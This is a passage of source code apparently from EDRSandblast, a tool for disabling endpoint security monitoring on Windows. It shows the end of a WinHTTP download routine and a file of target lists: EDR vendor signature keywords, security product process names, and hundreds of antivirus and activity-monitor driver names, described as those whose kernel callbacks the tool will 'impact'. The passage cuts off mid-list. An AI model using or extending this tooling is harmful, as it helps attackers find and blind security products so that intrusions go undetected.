	DWORD dwDownloadedSize = 0;
	SIZE_T allocatedSize = 4096;
	if (!WinHttpQueryDataAvailable(hRequest, &dwAvailableSize))
	{
		return FALSE;
	}
	*output = (PBYTE) malloc(allocatedSize);
	*output_size = 0;
	while (dwAvailableSize)
	{
		while (*output_size + dwAvailableSize > allocatedSize) {
			allocatedSize *= 2;
			PBYTE new_output = (PBYTE)realloc(*output, allocatedSize);
			if (new_output == NULL)
			{
				return FALSE;
			}
			*output = new_output;
		}
		if (!WinHttpReadData(hRequest, *output + *output_size, dwAvailableSize, &dwDownloadedSize))
		{
			return FALSE;
		}
		*output_size += dwDownloadedSize;

		WinHttpQueryDataAvailable(hRequest, &dwAvailableSize);
	}
	PBYTE new_output = (PBYTE)realloc(*output, *output_size);
	if (new_output == NULL)
	{
		return FALSE;
	}
	*output = new_output;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return TRUE;
}





```

`EDRSandblast/Utils/IsEDRChecks.c`:

```c
#include "../EDRSandblast.h"
#include "IsEDRChecks.h"

/*
* Primitives to check if a binary or driver belongs to an EDR product.
*/

// List of keywords matching EDR companies as employed for binary digitial signatures.
// TODO : enrich this list
TCHAR const* EDR_SIGNATURE_KEYWORDS[] = {
   _T("CarbonBlack"),
   _T("CrowdStrike"),
   _T("Cylance Smart Antivirus"),
   _T("Elastic Endpoint Security"),
   _T("FireEye"),
   _T("Kaspersky"),
   _T("McAfee"),
   _T("SentinelOne"),
   _T("Sentinel Labs"),
   _T("Symantec")
};

// List of binaries belonging to EDR products.
TCHAR const* EDR_BINARIES[] = {
    // Microsoft
   _T("HealthService.exe"),
   _T("MonitoringHost.exe"),
   _T("MpCmdRun.exe"),
   _T("MsMpEng.exe"),
   _T("MsSense.exe"),
   _T("SenseCncProxy.exe"),
   _T("SenseIR.exe"),
   // SentinelOne
   _T("LogCollector.exe"),
   _T("SentinelAgent.exe"),
   _T("SentinelAgentWorker.exe"),
   _T("SentinelBrowserNativeHost.exe"),
   _T("SentinelHelperService.exe"),
   _T("SentinelMemoryScanner.exe"),
   _T("SentinelRanger.exe"),
   _T("SentinelRemediation.exe"),
   _T("SentinelRemoteShellHost.exe"),
   _T("SentinelScanFromContextMenu.exe"),
   _T("SentinelServiceHost"),
   _T("SentinelStaticEngine.exe"),
   _T("SentinelStaticEngineScanner.exe"),
   _T("SentinelUI.exe"),
};

// List of EDR drivers for which Kernel callbacks will be impacted.
// Source: https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/allocated-altitudes
// Includes all FSFilter Anti-Virus and Activity Monitor drivers.
// and : https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-EDRCheck.ps1
TCHAR const* EDR_DRIVERS[] = {
    /*
    * FSFilter Anti-Virus - BEGIN
    */
    // 360 Software (Beijing)
   _T("360qpesv.sys"),
   // 5nine Software Inc.
   _T("5nine.cbt.sys"),
   // Ahkun Co.
   _T("AhkSvPro.sys"),
   _T("AhkUsbFW.sys"),
   _T("AhkAMFlt.sys"),
   // Ahnlab
   _T("V3MifiNt.sys"),
   _T("V3Ift2k.sys"),
   _T("V3IftmNt.sys"),
   _T("ArfMonNt.sys"),
   _T("AhnRghLh.sys"),
   _T("AszFltNt.sys"),
   _T("OMFltLh.sys"),
   _T("V3Flu2k.sys"),
   _T("AdcVcsNT.sys"),
   // AhnLab Inc.
   _T("TfFregNt.sys"),
   // AhnLab, Inc.
   _T("SMDrvNt.sys"),
   _T("ATamptNt.sys"),
   _T("V3Flt2k.sys"),
   // Alwil
   _T("aswmonflt.sys"),
   // Anvisoft
   _T("avfsmn.sys"),
   // Arcdo
   _T("ANVfsm.sys"),
   _T("CDrRSFlt.sys"),
   // Ashampoo GmbH & Co. KG
   _T("AshAvScan.sys"),
   // Australian Projects
   _T("ZxFsFilt.sys"),
   // Authentium
   _T("avmf.sys"),
   // AVG Grisoft
   _T("avgmfx86.sys"),
   _T("avgmfx64.sys"),
   _T("avgmfi64.sys"),
   _T("avgmfrs.sys"),
   // Avira GmbH
   _T("avgntflt.sys"),
   // AVNOS
   _T("kavnsi.sys"),
   // AvSoft Technologies
   _T("strapvista.sys"),
   _T("strapvista64.sys"),
   // AxBx
   _T("vk_fsf.sys"),
   // Baidu (beijing)
   _T("BDFileDefend.sys"),
   // Baidu (Hong Kong) Limited
   _T("Bfilter.sys"),
   // Baidu online network technology (beijing)Co.
   _T("BDsdKit.sys"),
   _T("bd0003.sys"),
   // Beijing Kingsoft
   _T("ksfsflt.sys"),
   // Beijing Majorsec
   _T("majoradvapi.sys"),
   // Beijing Rising Information Technology Corporation Limited
   _T("HookSys.sys"),
   // Beijing Venus
   _T("TxFileFilter.sys"),
   _T("VTSysFlt.sys"),
   // Binary Defense Systems
   _T("Osiris.sys"),
   // Bit9 Inc
   _T("b9kernel.sys"),
   // Bitdefender
   _T("bdsvm.sys"),
   // BitDefender SRL
   _T("hbflt.sys"),
   _T("vlflt.sys"),
   _T("gzflt.sys"),
   _T("bddevflt.sys"),
   _T("ignis.sys"),
   _T("AVCKF.SYS"),
   _T("gemma.sys"),
   _T("Atc.sys"),
   _T("AVC3.SYS"),
   _T("TRUFOS.SYS"),
   // Bkav Corporation
   _T("BkavAutoFlt.sys"),
   _T("BkavSdFlt.sys"),
   // BLACKFORT SECURITY
   _T("bSyirmf.sys"),
   _T("bSysp.sys"),
   _T("bSydf.sys"),
   _T("bSywl.sys"),
   _T("bSyrtm.sys"),
   _T("bSyaed.sys"),
   _T("bSyar.sys"),
   // BullGuard
   _T("BdFileSpy.sys"),
   // C-NetMedia Inc
   _T("antispyfilter.sys"),
   // CheckMAL Inc
   _T("AppCheckD.sys"),
   // Cheetah Mobile Inc.
   _T("wdocsafe.sys"),
   _T("lbprotect.sys"),
   // Cisco Systems
   _T("csaav.sys"),
   _T("CiscoSAM.sys"),
   _T("immunetselfprotect.sys"),
   _T("immunetprotect.sys"),
   _T("CiscoAMPCEFWDriver.sys"),
   _T("CiscoAMPHeurDriver.sys"),
   // CJSC Returnil Software
   _T("rvsmon.sys"),
   // CodeProof Technologies Inc
   _T("CpAvFilter.sys"),
   _T("CpAvKernel.sys"),
   // Comodo Group Inc.
   _T("cmdccav.sys"),
   _T("cmdguard.sys"),
   // Computer Assoc
   _T("caavFltr.sys"),
   _T("ino_fltr.sys"),
   // ConeSecurity Inc
   _T("CSFlt.sys"),
   // Confluera Inc
   _T("tbmninifilter.sys"),
   // Coranti Inc.
   _T("crnsysm.sys"),
   _T("crncache32.sys"),
   _T("crncache64.sys"),
   // CoreTrace Corporation
   _T("bouncer.sys"),
   // CrowdStrike Ltd.
   _T("csagent.sys"),
   // Dakota State University
   _T("EdnemFsFilter.sys"),
   // Deep Instinct
   _T("DeepInsFS.sys"),
   // Deep Instinct Ltd.
   _T("DeepInsFS.sys"),
   // Digitalonnet
   _T("ADSpiderDoc.sys"),
   // Doctor Web
   _T("drwebfwft.sys"),
   _T("DwShield.sys"),
   _T("DwShield64.sys"),
   _T("dwprot.sys"),
   // Doctor Web Ltd.
   _T("Spiderg3.sys"),
   // DriveSentry Inc
   _T("drivesentryfilterdriver2lite.sys"),
   // EasyAntiCheat Solutions
   _T("easyanticheat.sys"),
   // eEye Digital Security
   _T("eeyehv.sys"),
   _T("eeyehv64.sys"),
   // Egnyte Inc
   _T("egnfsflt.sys"),
   // EMC
   _T("ECATDriver.sys"),
   // Emsi Software GmbH
   _T("a2ertpx86.sys"),
   _T("a2ertpx64.sys"),
   _T("a2gffx86.sys"),
   _T("a2gffx64.sys"),
   _T("a2gffi64.sys"),
   _T("a2acc.sys"),
   _T("a2acc64.sys"),
   // EnigmaSoft
   _T("EnigmaFileMonDriver.sys"),
   // ESET, spol. s r.o.
   _T("eamonm.sys"),
   // ESTsecurity Corp
   _T("RSRtw.sys"),
   _T("RSPCRtw.sys"),
   // ESTsoft
   _T("AYFilter.sys"),
   _T("Rtw.sys"),
   // ESTsoft corp.
   _T("EstRkmon.sys"),
   _T("EstRkr.sys"),
   // ETRI
   _T("vrSDetri.sys"),
   _T("vrSDetrix.sys"),
   // Everyzone
   _T("TvMFltr.sys"),
   // EveryZone Inc.
   _T("IProtect.sys"),
   // EveryZone INC.
   _T("TvFiltr.sys"),
   _T("TvDriver.sys"),
   _T("TvSPFltr.sys"),
   _T("TvPtFile.sys"),
   // f-protect
   _T("fpav_rtp.sys"),
   // f-secure
   _T("fsgk.sys"),
   // Filseclab
   _T("fildds.sys"),
   // Fortinet Inc.
   _T("FortiAptFilter.sys"),
   _T("fortimon2.sys"),
   _T("fortirmon.sys"),
   _T("fortishield.sys"),
   // Fujitsu Social Science
   _T("wscm.sys"),
   // FXSEC LTD
   _T("pfkrnl.sys"),
   // G Data
   _T("HookCentre.sys"),
   _T("PktIcpt.sys"),
   _T("MiniIcpt.sys"),
   // GAS Tecnologia
   _T("GbpKm.sys"),
   // Greatsoft Corp.Ltd
   _T("vcdriv.sys"),
   _T("vcreg.sys"),
   _T("vchle.sys"),
   // GRGBanking Equipment
   _T("SECOne_USB.sys"),
   _T("SECOne_Proc10.sys"),
   _T("SECOne_REG10.sys"),
   _T("SECOne_FileMon10.sys"),
   // GridinSoft LLC
   _T("gtkdrv.sys"),
   // HAURI
   _T("VrARnFlt.sys"),
   _T("VrBBDFlt.sys"),
   _T("vrSDfmx.sys"),
   _T("vrSDam.sys"),
   _T("VrAptDef.sys"),
   _T("VrSdCore.sys"),
   _T("VrFsFtM.sys"),
   _T("VrFsFtMX.sys(AMD64)"),
   _T("vradfil2.sys"),
   // HAURI Inc.
   _T("VRAPTFLT.sys"),
   // Hidden Reflex
   _T("epicFilter.sys"),
   // Hitachi Solutions
   _T("hsmltwhl.sys"),
   _T("hssfwhl.sys"),
   // HSM IT-Services Gmbh
   _T("oavfm.sys"),
   // Huorong Security
   _T("sysdiag.sys"),
   // IBM
   _T("issregistry.sys"),
   // IKARUS Security
   _T("ntguard.sys"),
   // Imperva Inc.
   _T("mfdriver.sys"),
   // INCA Internet Co.
   _T("npxgd.sys"),
   _T("npxgd64.sys"),
   _T("tkpl2k.sys"),
   _T("tkpl2k64.sys"),
   _T("GKFF.sys"),
   _T("GKFF64.sys"),
   _T("tkdac2k.sys"),
   _T("tkdacxp.sys"),
   _T("tkdacxp64.sys"),
   _T("tksp2k.sys"),
   _T("tkspxp.sys"),
   _T("tkspxp64.sys"),
   // INCA Internet Co., Ltd
   _T("tkfsft.sys"),
   _T("tkfsft64.sys"),
   _T("tkfsavxp.sys"),
   _T("tkfsavxp64.sys"),
   // Individual developer (Soft3304)
   _T("AntiLeakFilter.sys"),
   // IObit Information Tech
   _T("IMFFilter.sys"),
   // ISS
   _T("issfltr.sys"),
   // K7 Computing Private Ltd.
   _T("K7Sentry.sys"),
   // Kaspersky
   _T("klbg.sys"),
   _T("kldback.sys"),
   _T("kldlinf.sys"),
   _T("kldtool.sys"),
   _T("klif.sys"),
   // Kaspersky Lab
   _T("klam.sys"),
   _T("klif.sys"),
   // KINGSOFT
   _T("dgsafe.sys"),
   // knowwheresoft Ltd
   _T("securoFSD_x64.sys"),
   // Komoku Inc.
   _T("kmkuflt.sys"),
   // Lavasoft AB
   _T("lbd.sys"),
   // Leith Bade
   _T("cwdriver.sys"),
   // Lenovo
   _T("lnvscenter.sys"),
   // Lightspeed Systems Inc.
   _T("SAFsFilter.sys"),
   // Malwarebytes Corp.
   _T("FlightRecorder.sys"),
   _T("mbam.sys"),
   // MastedCode Ltd
   _T("fsfilter.sys"),
   // Max Secure Software
   _T("MaxProc64.sys"),
   _T("MaxProtector.sys"),
   _T("maxcryptmon.sys"),
   _T("SDActMon.sys"),
   // McAfee Inc.
   _T("epdrv.sys"),
   _T("mfencoas.sys"),
   _T("mfehidk.sys"),
   _T("swin.sys"),
   // Meidensha Corp
   _T("WhiteShield.sys"),
   // Microsoft
   _T("WdFilter.sys"),
   _T("mpFilter.sys"),
   _T("SysmonDrv.sys"),
   // MicroWorld Software Services Pvt. Ltd.
   _T("mwfsmfltr.sys"),
   // NeoAutus
   _T("NeoKerbyFilter"),
   // Netlor SAS
   _T("KUBWKSP.sys"),
   // NetSecurity Corp
   _T("trfsfilter.sys"),
   // NHN
   _T("nsminflt.sys"),
   _T("nsminflt64.sys"),
   // Norman
   _T("nvcmflt.sys"),
   // Norman ASA
   _T("nprosec.sys"),
   _T("nregsec.sys"),
   // Novatix Corporation
   _T("NxFsMon.sys"),
   // NPcore Ltd
   _T("FileScan.sys"),
   // Odyssey Cyber Security
   _T("ODFsFimFilter.sys"),
   _T("ODFsTokenFilter.sys"),
   _T("ODFsFilter.sys"),
   // OKUMA Corp
   _T("ospfile_mini.sys"),
   // OnMoon Company LLC
   _T("acdrv.sys"),
   // Palo Alto Networks
   _T("CyvrFsfd.sys"),
   // Panda Security
   _T("PSINPROC.SYS"),
   _T("PSINFILE.SYS"),
   _T("amfsm.sys"),
   _T("amm8660.sys"),
   _T("amm6460.sys"),
   // Panda Software
   _T("NanoAVMF.sys"),
   _T("shldflt.sys"),
   // Panzor Cybersecurity
   _T("pavdrv.sys"),
   // Paretologic
   _T("PLGFltr.sys"),
   // PC Tools Pty. Ltd.
   _T("PCTCore64.sys"),
   _T("PCTCore.sys"),
   _T("ikfilesec.sys"),
   // Perfect World Co. Ltd
   _T("PerfectWorldAntiCheatSys.sys"),
   // PerfectWorld Ltd
   _T("PWProtect.sys"),
   // PerSystems SA
   _T("pervac.sys"),
   // Pooyan System
   _T("RanPodFS.sys"),
   // PWI, Inc.
   _T("pwipf6.sys"),
   // Qihoo 360
   _T("dsark.sys"),
   _T("360avflt.sys"),
   // Quick Heal Technologies Pvt. Ltd.
   _T("snsrflt.sys"),
   _T("bdsflt.sys"),
   _T("arwflt.sys"),
   // Quick Heal TechnologiesPvt. Ltd.
   _T("ggc.sys"),
   _T("catflt.sys"),
   // ReaQta Ltd.
   _T("reaqtor.sys"),
   // Redstor Limited
   _T("RsFlt.sys"),
   // refractionPOINT
   _T("hcp_kernel_acq.sys"),
   // REVE Antivirus
   _T("ReveFltMgr.sys"),
   _T("ReveProcProtection.sys"),
   // S.N.Safe&Software
   _T("snscore.sys"),
   // Sangfor Technologies
   _T("sfavflt.sys"),
   // Savant Protection, Inc.
   _T("savant.sys"),
   // Scargo Inc
   _T("si32_file.sys"),
   _T("si64_file.sys"),
   // SECUI Corporation
   _T("sciptflt.sys"),
   _T("scifsflt.sys"),
   // SecuLution GmbH
   _T("ssvhook.sys"),
   // SecureAge Technology
   _T("sascan.sys"),
   // SecureBrain Corporation
   _T("mscan-rt.sys"),
   // SecureLink Inc.
   _T("zwPxeSvr.sys"),
   _T("zwASatom.sys"),
   // Securitas Technologies,Inc.
   _T("NovaShield.sys"),
   // SecurityCoverage, Inc.
   _T("SCFltr.sys"),
   // Segira LLC
   _T("SegiraFlt.sys"),
   // Segurmatica
   _T("SegMD.sys"),
   _T("SegMP.sys"),
   _T("SegF.sys"),
   // Sequretek IT
   _T("KawachFsMinifilter.sys"),
   // SGA
   _T("EPSMn.sys"),
   // SGRI Co., LTD.
   _T("vcMFilter.sys"),
   // SheedSoft Ltd
   _T("SheedAntivirusFilterDriver.sys"),
   // Shenzhen Tencent Computer Systems Company Limited
   _T("TSysCare.sys"),
   _T("TFsFlt.sys"),
   // Softwin
   _T("bdfsfltr.sys"),
   _T("bdfm.sys"),
   // Sophos
   _T("SophosED.sys"),
   _T("SAVOnAccess.sys"),
   _T("savonaccess.sys"),
   _T("sld.sys"),
   // SpellSecurity
   _T("spellmon.sys"),
   // Sybonic Systems Inc
   _T("THFilter.sys"),
   // symantec
   _T("eeCtrl.sys"),
   _T("eraser.sys"),
   _T("SRTSP.sys"),
   _T("SRTSPIT.sys"),
   _T("SRTSP64.SYS"),
   // Symantec
   _T("VirtualAgent.sys"),
   // Tall Emu
   _T("OADevice.sys"),
   // Technology Nexus AB
   _T("SE46Filter.sys"),
   // TEHTRI-Security
   _T("egambit.sys"),
   // Tencent
   _T("TesMon.sys"),
   _T("QQSysMonX64.sys"),
   _T("QQSysMon.sys"),
   // Teramind
   _T("tmfsdrv2.sys"),
   // TRAPMINE A.S.
   _T("trpmnflt.sys"),
   // Trend
   _T("tmpreflt.sys"),
   // Trend Micro Inc.
   _T("TmKmSnsr.sys"),
   _T("fileflt.sys"),
   _T("TmEsFlt.sys"),
   _T("TmEyes.sys"),
   _T("tmevtmgr.sys"),
   // Verdasys Inc
   _T("STKrnl64.sys"),
   // VisionPower Co.,Ltd.
   _T("PZDrvXP.sys"),
   // VMware, Inc.
   _T("vsepflt.sys"),
   _T("VFileFilter.sys(renamed)"),
   // WardWiz
   _T("WrdWizSecure64.sys"),
   _T("wrdwizscanner.sys"),
   // Webroot Inc.
   _T("WRAEKernel.sys"),
   _T("WRKrn.sys"),
   _T("WRCore.sys"),
   // Webroot Software, Inc.
   _T("ssfmonm.sys"),
   // White Cloud Security
   _T("WCSDriver.sys"),
   // WidgetNuri Corp
   _T("SoftFilterxxx.sys"),
   _T("RansomDefensexxx.sys"),
   // WINS CO. LTD
   _T("agentrtm64.sys"),
   _T("rswmon.sys"),
   // Yoggie
   _T("UFDFilter.sys"),
   // ZhengYong InfoTech LTD.
   _T("Zyfm.sys"),
   /*
   * FSFilter Anti-Virus - END
   */
   /*
   * FSFilter Activity Monitor - BEGIN
   */
   // (c)SMS
   _T("isafermon"),
   // 1mill
   _T("FSMon.sys"),
   // 360 Software (Beijing)
   _T("AtdrAgent.sys"),
   _T("AtdrAgent64.sys"),
   _T("Qutmdrv.sys"),
   // Absolute Software
   _T("cbfsfilter2017.sys"),
   // Acronis
   _T("NgScan.sys"),
   // Actifio Inc
   _T("aaf.sys"),
   // Adaptiva
   _T("AdaptivaClientCache32.sys"),
   _T("AdaptivaclientCache64.sys"),
   // Adtrustmedia
   _T("browserMon.sys"),
   // AhnLab, Inc.
   _T("VPDrvNt.sys"),
   // AI Consulting
   _T("aictracedrv_am.sys"),
   // Airlock Digital Pty Ltd
   _T("alcapture.sys"),
   // AIRWare Technology Ltd
   _T("airship-filter.sys"),
   // Alfa
   _T("AlfaFF.sys"),
   // Aliaksander Lebiadzevich
   _T("SDDrvLdr.sys"),
   // AlphaAntiLeak
   _T("AALProtect.sys"),
   // ALPS SYSTEM INTERGRATION CO.
   _T("ISIRMFmon.sys"),
   // Altaro Ltd.
   _T("altcbt.sys"),
   // ALWIL Software
   _T("aswFsBlk.sys"),
   // Amazon Web Services Inc
   _T("AmznMon.sys"),
   // Analytik Jena AG
   _T("ajfsprot.sys"),
   // ApexSQL LLC
   _T("ApexSqlFilterDriver.sys"),
   // AppGuard LLC
   _T("AGSysLock.sys"),
   _T("AGSecLock.sys"),
   // AppiXoft
   _T("axfsysmon.sys"),
   _T("scensemon.sys"),
   // AppSense Ltd
   _T("DataNow_Driver.sys"),
   _T("UcaFltDriver.sys"),
   // AppStream, Inc.
   _T("rflog.sys"),
   // ApSoft
   _T("CwMem2k64.sys"),
   // Aqua Security
   _T("ContainerMonitor.sys"),
   // Arcserve
   _T("xoiv8x64.sys"),
   // Arkoon Network Security
   _T("heimdall.sys"),
   // Ashampoo Development
   _T("IFS64.sys"),
   // AsiaInfo Technologies
   _T("kFileFlt.sys"),
   // Aternity Ltd
   _T("AternityRegistryHook.sys"),
   // Atlansys Software
   _T("atflt.sys"),
   _T("amfd.sys"),
   // Avanite Limited
   _T("AvaPsFD.sys"),
   // Avast Software
   _T("aswSP.sys"),
   // AVG Technologies CZ
   _T("avgtpx86.sys"),
   _T("avgtpx64.sys"),
   // Avira GmbH
   _T("avipbb.sys"),
   // AvSoft Technologies
   _T("strapvista.sys"),
   // Axact Pvt Ltd
   _T("axfltdrv.sys"),
   // Axur Information Sec.
   _T("amsfilter.sys"),
   // Backup Systems Ltd
   _T("cbfltfs4.sys"),
   // Baidu (beijing)
   _T("BdRdFolder.sys"),
   // Baidu (Hong Kong) Limited
   _T("Bfmon.sys"),
   // Baidu Online Network
   _T("bdsysmon.sys"),
   // Barkly Protects Inc.
   _T("BOsCmFlt.sys"),
   _T("BOsFsFltr.sys"),
   // Basein Networks
   _T("cbfsfilter2017.sys"),
   // BattlEye Innovations
   _T("BEDaisy.sys"),
   // Beijing CA-JinChen Software Co.
   _T("kfac.sys"),
   // Beijing QiAnXin Tech.
   _T("QmInspec.sys"),
   // Beijing Qihoo Technology Co.
   _T("360fsflt.sys"),
   // Beijing Shu Yan Science
   _T("GagSecurity.sys"),
   // Beijing Zhong Hang Jiaxin Computer Technology Co.,Ltd.
   _T("filefilter.sys"),
   // Best Security
   _T("rpwatcher.sys"),
   // BeyondTrust Inc.
   _T("BlackbirdFSA.sys"),
   // BicDroid Inc.
   _T("QDocumentREF.sys"),
   // Bit9 Inc.
   _T("CarbonBlackK.sys"),
   // BitArmor Systems, Inc
   _T("bapfecpt.sys"),
   _T("bamfltr.sys"),
   // Bitdefender SRL
   _T("edrsensor.sys"),
   _T("bdprivmon.sys"),
   // bitFence Inc.
   _T("bfaccess.sys"),
   // BiZone LLC
   _T("bzsenyaradrv.sys"),
   _T("bzsenspdrv.sys"),
   _T("bzsenth.sys"),
   // Blue Ridge Networks
   _T("BrnFileLock.sys"),
   _T("BrnSecLock.sys"),
   // Bluzen Inc
   _T("ipcomfltr.sys"),
   // Broadcom
   _T("symevnt.sys"),
   _T("symevnt32.sys"),
   // Bromium Inc
   _T("brfilter.sys"),
   _T("BrCow_x_x_x_x.sys"),
   _T("BemK.sys"),
   // ByStorm
   _T("BssAudit.sys"),
   // C-DAC Hyderabad
   _T("pecfilter.sys"),
   // CA
   _T("xomfcbt8x64.sys"),
   _T("KmxAgent.sys"),
   _T("KmxFile.sys"),
   _T("KmxSbx.sys"),
   // Carbonite Inc
   _T("MozyNextFilter.sys"),
   _T("MozyCorpFilter.sys"),
   _T("MozyEntFilter.sys"),
   _T("MozyOEMFilter.sys"),
   _T("MozyEnterpriseFilter.sys"),
   _T("MozyProFilter.sys"),
   _T("MozyHomeFilter.sys"),
   _T("BDSFilter.sys"),
   _T("CSBFilter.sys"),
   // cEncrypt
   _T("dsflt.sys"),
   // Centennial Software Ltd
   _T("msiodrv4.sys"),
   // Centre for Development of Advanced Computing
   _T("USBPDH.SYS"),
   // Centrify Corp
   _T("CentrifyFSF.sys"),
   // Certero
   _T("cmflt.sys"),
   // Chaewool
   _T("cFSfdrv"),
   // Check Point Software
   _T("epregflt.sys"),
   _T("epklib.sys"),
   // Checkpoint Software
   _T("cpepmon.sys"),
   // ChemoMetec
   _T("ChemometecFilter.sys"),
   // Cigent Technology Inc
   _T("Spotlight.sys"),
   // Cigital, Inc.
   _T("fmdrive.sys"),
   // Cisco Systems
   _T("csaam.sys"),
   // Citrix Systems
   _T("srminifilterdrv.sys"),
   // Clonix Co
   _T("rsfdrv.sys"),
   // Clumio Inc
   _T("ClumioChangeBlockMf.sys"),
   // Code42
   _T("Code42Filter.sys"),
   // ColorTokens
   _T("FFDriver.sys"),
   // Comae Tech
   _T("windd.sys"),
   // CommVault Systems, Inc.
   _T("CVCBT.sys"),
   // Comodo Security Solutions Inc.
   _T("CmdCwagt.sys"),
   _T("cfrmd.sys"),
   // ComTrade
   _T("ctamflt.sys"),
   // Comtrue Technology
   _T("shdlpSf.sys"),
   _T("ctrPAMon.sys"),
   _T("shdlpMedia.sys"),
   // Conduant Corporation
   _T("ConduantFSFltr.sys"),
   // Condusiv Technologies
   _T("hiofs.sys"),
   // CondusivTechnologies
   _T("vintmfs.sys"),
   _T("intmfs.sys"),
   _T("excfs.sys"),
   // Confio
   _T("IridiumSwitch.sys"),
   // CONNECT SHIFT LTD
   _T("DTPL.sys"),
   // CoSoSys
   _T("cssdlp.sys"),
   // Crawler Group
   _T("tbrdrv.sys"),
   // Credant Technologies
   _T("XendowFLT.sys"),
   // CristaLink
   _T("mtsvcdf.sys"),
   // CRU Data Security Group
   _T("CdsgFsFilter.sys"),
   // CyberArk Software
   _T("vfpd.sys"),
   _T("CybKernelTracker.sys"),
   // CyberSight Inc
   _T("csmon.sys"),
   // Cygna Labs
   _T("FileMonitor.sys"),
   // Cylance Inc.
   _T("CyOptics.sys"),
   _T("CyProtectDrv32.sys"),
   _T("CyProtectDrv64.sys"),
   // Cytrence Inc
   _T("cytmon.sys"),
   // Datacloak Tech
   _T("dcfsgrd.sys"),
   // DataGravity Inc.
   _T("dgfilter.sys"),
   // Datto Inc
   _T("DattoFSF.sys"),
   // Dell Secureworks
   _T("groundling32.sys"),
   _T("groundling64.sys"),
   // Dell Software Inc.
   _T("DgeDriver.sys"),
   // DELL Technologies
   _T("DTDSel.sys"),
   // Dell Technologies
   _T("NWEDriver.sys"),
   // derivo GmbH
   _T("bbfilter.sys"),
   // Digitalsense Co
   _T("dsfltfs.sys"),
   // Diskeeper Corporation
   _T("nowonmf.sys"),
   _T("dktlfsmf.sys"),
   _T("DKDrv.sys"),
   _T("DKRtWrt.sys"),
   _T("HBFSFltr.sys"),
   // Dmitry Stefankov
   _T("WinTeonMiniFilter.sys"),
   _T("wiper.sys"),
   _T("DevMonMiniFilter.sys"),
   // Doctor Web
   _T("Drwebfwflt.sys"),
   _T("EventMon.sys"),
   // Douzone Bizon Co
   _T("rswctrl.sys"),
   _T("mcstrg.sys"),
   _T("fmkkc.sys"),
   _T("nmlhssrv01.sys"),
   // DreamCrafts
   _T("SaMFlt.sys"),
   // Dtex Systems
   _T("dnaFSMonitor.sys"),
   // EaseVault Technologies Inc.
   _T("EaseFlt.sys"),
   // Egis Technology Inc.
   _T("eLock2FSCTLDriver.sys"),
   // Egnyte Inc
   _T("egnfsflt.sys"),
   // eIQnetworks Inc.
   _T("FIM.sys"),
   // Elex Tech Inc
   _T("iSafeKrnl.sys"),
   _T("iSafeKrnlMon.sys"),
   // eMingSoftware Inc
   _T("NetPeeker.sys"),
   // Encourage Technologies
   _T("asiofms.sys"),
   // Enterprise Data Solutions, Inc.
   _T("edsigk.sys"),
   // Entrust Inc.
   _T("eetd32.sys"),
   _T("eetd64.sys"),
   // ESET, spol. s r.o.
   _T("ehdrv.sys"),
   // ESTsoft corp.
   _T("EstPrmon.sys"),
   _T("Estprp.sys"),
   _T("EstRegmon.sys"),
   _T("EstRegp.sys"),
   // F-Secure
   _T("fshs.sys"),
   _T("fsatp.sys"),
   // Faronics Corporation
   _T("AeFilter.sys"),
   // FastTrack Software ApS
   _T("AbrPmon.sys"),
   // FFC Limited
   _T("FFCFILT.SYS"),
   // FileTek, Inc.
   _T("TrustedEdgeFfd.sys"),
   // FireEye Inc
   _T("WFP_MRT.sys"),
   // FireEye Inc.
   _T("FeKern.sys"),
   // Fitsec Ltd
   _T("kconv.sys"),
   _T("trace.sys"),
   _T("SandDriver.sys"),
   // Flexera Software Inc.
   _T("ISRegFlt.sys"),
   _T("ISRegFlt64.sys"),
   // ForcePoint LLC.
   _T("fpepflt.sys"),
   // Fujian Shen Kong
   _T("wats_se.sys"),
   // FUJITSU ENGINEERING
   _T("ibr2fsk.sys"),
   // FUJITSU LIMITED
   _T("FJGSDis2.sys"),
   _T("FJSeparettiFilterRedirect.sys"),
   _T("Fsw31rj1.sys"),
   _T("da_ctl.sys"),
   // FUJITSU SOCIAL SCIENCE
   _T("secure_os.sys"),
   // FUJITSU SOFTWARE
   _T("PsAcFileAccessFilter.sys"),
   // Fusion-io
   _T("fiometer.sys"),
   _T("dcSnapRestore.sys"),
   // Futuresoft
   _T("PointGuardVistaR32.sys"),
   _T("PointGuardVistaR64.sys"),
   _T("PointGuardVistaF.sys"),
   _T("PointGuardVista64F.sys"),
   // G Data Software AG
   _T("gddcv.sys"),
   // GameHi Co.
   _T("Codex.sys"),
   // GemacmbH
   _T("GcfFilter.sys"),
   // Glarysoft Ltd.
   _T("GUMHFilter.sys"),
   // Google, Inc.
   _T("MRxGoogle.sys"),
   // Gorizonty Rosta Ltd
   _T("GoFSMF.sys"),
   // GrammaTech, Inc.
   _T("drvhookcsmf.sys"),
   _T("drvhookcsmf_amd64.sys"),
   // Group-IB LTD
   _T("gibepcore.sys"),
   // HA Unix Pt
   _T("hafsnk.sys"),
   // Hangzhou Yifangyun
   _T("fangcloud_autolock_driver.sys"),
   // HAURI
   _T("secure_os_mf.sys"),
   // Hauri Inc
   _T("VrVBRFsFilter.sys"),
   _T("VrExpDrv.sys"),
   // HAVELSAN A.
   _T("HVLMinifilter.sys"),
   // HEAT Software
   _T("SK.sys"),
   // Heilig Defense LLC
   _T("HDRansomOffDrv.sys"),
   _T("HDCorrelateFDrv.sys"),
   _T("HDFileMon.sys"),
   // HeroBravo Technology
   _T("sysdiag.sys"),
   // Hexis Cyber Solutions
   _T("HexisFSMonitor.sys"),
   // HFN Inc.
   _T("RGNT.sys"),
   // Hitachi Solutions
   _T("hsmltmon.sys"),
   // Honeycomb Technologies
   _T("dskmn.sys"),
   // HP
   _T("hpreg.sys"),
   // i-Guard SAS
   _T("iGuard.sys"),
   // I-O DATA DEVICE
   _T("sConnect.sys"),
   // IBM
   _T("NmpFilter.sys"),
   _T("FsMonitor.sys"),
   // Idera
   _T("IderaFilterDriver.sys"),
   // Idera Software
   _T("SQLsafeFilterDriver.sys"),
   // IGLOO SECURITY, Inc.
   _T("kmNWCH.sys"),
   // IKARUS Security
   _T("Sonar.sys"),
   // Immidio B.V.
   _T("immflex.sys"),
   // in-soft Kft.
   _T("LmDriver.sys"),
   // INCA Internet Co.
   _T("GKPFCB.sys"),
   _T("GKPFCB64.sys"),
   // INCA Internet Co.,Ltd.
   _T("TkPcFtCb.sys"),
   _T("TkPcFtCb64.sys"),
   // Industrial Technology
   _T("icrlmonitor.sys"),
   // InfoCage
   _T("IccFilterSc.sys"),
   // Informzaschita
